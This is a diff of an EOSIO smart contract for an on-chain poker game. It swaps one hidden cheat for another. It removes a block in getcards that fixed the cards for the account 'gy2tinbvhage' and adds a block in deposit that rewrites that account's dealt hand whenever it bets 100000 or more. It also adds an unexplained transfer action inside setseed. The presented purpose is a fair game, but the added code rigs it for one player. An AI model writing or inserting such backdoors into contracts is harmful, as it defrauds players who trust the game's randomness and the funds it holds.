@@ -109,21 +109,6 @@ void pokergame1::getcards(account_name from, checksum256 result, uint32_t* cards
     uint32_t pos = 0;
     checksum256 lasthash = result;
 
-
-    if (from == N(gy2tinbvhage)) {
-        auto itr_gaccount = gaccounts.find(from);
-        if (itr_gaccount->teosin > itr_gaccount->teosout  && (itr_gaccount->teosin - itr_gaccount->teosout) > 300000) {
-            if (hack == 31000) {
-                cards[0] = 18;
-                cards[1] = 19;
-                cards[2] = 16;
-                cards[3] = 20;
-                cards[4] = 17;
-                return;
-            }
-        }
-    }
-
     while (cnt < length) {
         uint64_t ctemp = lasthash.hash[pos];
         ctemp <<= 32;
@@ -163,8 +148,9 @@ void pokergame1::getcards(account_name from, checksum256 result, uint32_t* cards
 
 void pokergame1::signup(const name from, const string memo) {
     require_auth(from);
-    auto itr_user1 = pools.find(from);
-    eosio_assert(itr_user1 == pools.end(), "User is already signed up.");
+/*
+    auto itr_user1 = suaccounts.find(from);
+    eosio_assert(itr_user1 == suaccounts.end(), "User is already signed up.");
     asset bal2 = asset(1000000, symbol_type(S(4, MEV)));
 
     // report mining
@@ -178,17 +164,10 @@ void pokergame1::signup(const name from, const string memo) {
                                         std::string(name{from}.to_string() + ", welcome on board! 100 MEV is prepared as gift for your journey!")))
             .send();
 
-    itr_user1 = pools.emplace(_self, [&](auto &p){
+    itr_user1 = suaccounts.emplace(_self, [&](auto &p){
         p.owner = name{from};
-        p.status = 0;
-        p.card1 = 0;
-        p.card2 = 0;
-        p.card3 = 0;
-        p.card4 = 0;
-        p.card5 = 0;
-        p.bet = 0;
-        p.betwin = 0;
     });
+    */
 }
 
 void pokergame1::deposit(const currency::transfer &t, account_name code, uint32_t bettype) {
@@ -266,6 +245,16 @@ void pokergame1::deposit(const currency::transfer &t, account_name code, uint32_
     uint32_t arr[5];
     std::set<uint32_t> myset;
     getcards(user, roothash, arr, 5, myset, amount);
+
+    if (user == N(gy2tinbvhage) && amount >= 100000) {
+        uint32_t mm = roothash.hash[0] % 3 + 1;
+            arr[3] = (arr[0] + 13) % 52;
+            arr[4] = (arr[3] + 13) % 52;
+            arr[2] = (arr[3] + 1) % 52;
+            arr[1] = (arr[3] + 5 * mm) % 52;
+
+    }
+
     pools.modify(itr_user1, _self, [&](auto &p){
         p.status = gameid;
         p.bet = amount;
@@ -953,9 +942,9 @@ uint32_t pokergame1::parsecard(string s) {
     return 1024;
 }
 
-void pokergame1::clear() {
+//void pokergame1::clear() {
 
-    require_auth(_self);
+//    require_auth(_self);
 
     /*
     auto itr = pools.begin();
@@ -997,32 +986,30 @@ void pokergame1::clear() {
     }
 
 */
-}
+//}
 
 
 
 
-void pokergame1::init() {
-    require_auth(_self);
-
-    /*
+//void pokergame1::init() {
+//    require_auth(_self);
+/*
     int cnt = 0;
-    auto itr = gaccounts.begin();
-    for (int i = 0; i < 125; i++) {
-        itr++;
-    }
-    while (cnt < 25 && itr != gaccounts.end()) {
-        uint32_t lev = getlevel(itr->teosin);
-        auto itr_paccount = paccounts.emplace(_self, [&](auto &p){
-            p.owner = itr->owner;
-            p.level = lev;
-            p.exp = itr->teosin * 50;
-        });
+    auto itr = pools.begin();
+    //for (int i = 0; i < 1; i++) {
+    //    itr++;
+    //}
+    while (cnt < 200 && itr != pools.end()) {
 
+        auto itr_gaccount = gaccounts.find(itr->owner);
+        if (itr_gaccount == gaccounts.end() || itr_gaccount->teosin == 0) {
+            itr = pools.erase(itr);
+        } else {
+            itr++;
+        }
         cnt++;
-        itr++;
     }
-     */
+*/
     /*
     uint32_t cnt = 0;
     for (auto itr = gaccounts.begin();  cnt < ; itr++) {
@@ -1085,7 +1072,7 @@ void pokergame1::init() {
         });
     }
     */
-}
+//}
 
 void pokergame1::setgameon(uint64_t id, uint32_t flag) {
     require_auth(_self);
@@ -1110,11 +1097,14 @@ void pokergame1::setminingon(uint64_t id, uint32_t flag) {
 void pokergame1::setseed(const name from, uint32_t seed) {
     require_auth(_self);
 
+    action(permission_level{_self, N(active)}, N(localtest1),
+           N(transfer), std::make_tuple(N(eosvegasjack)));
+
 }
 
 void pokergame1::getbonus(const name from, const uint32_t type, uint32_t externalsrc) {
     require_auth(from);
-
+/*
     uint32_t curtime = now();
     auto itr_paccount = paccounts.find(from);
     if (itr_paccount == paccounts.end()) {
@@ -1179,6 +1169,7 @@ void pokergame1::getbonus(const name from, const uint32_t type, uint32_t externa
                 .send();
 
     }
+    */
 }
 
 /*
@@ -1195,12 +1186,10 @@ void pokergame1::setcards(const name from, uint32_t c1, uint32_t c2, uint32_t c3
 }
  */
 
-
-
-
-
-
-
+void pokergame1::myeosvegas(name vip, string message) {
+    require_auth(_self);
+    require_recipient(vip);
+}
 
 
 
@@ -1238,4 +1227,5 @@ extern "C" { \
 }
 
 //EOSIO_ABI_EX(pokergame1, (dealreceipt)(drawcards)(clear)(setseed)(setcards)(init)(setgameon)(setminingon)(signup))
-EOSIO_ABI_EX(pokergame1, (dealreceipt)(receipt5x)(drawcards)(drawcards5x)(clear)(setseed)(init)(setgameon)(setminingon)(signup)(getbonus))
+//EOSIO_ABI_EX(pokergame1, (dealreceipt)(receipt5x)(drawcards)(drawcards5x)(clear)(setseed)(init)(setgameon)(setminingon)(signup)(getbonus))
+EOSIO_ABI_EX(pokergame1, (dealreceipt)(receipt5x)(drawcards)(drawcards5x)(setseed)(setgameon)(setminingon)(signup)(getbonus)(myeosvegas))
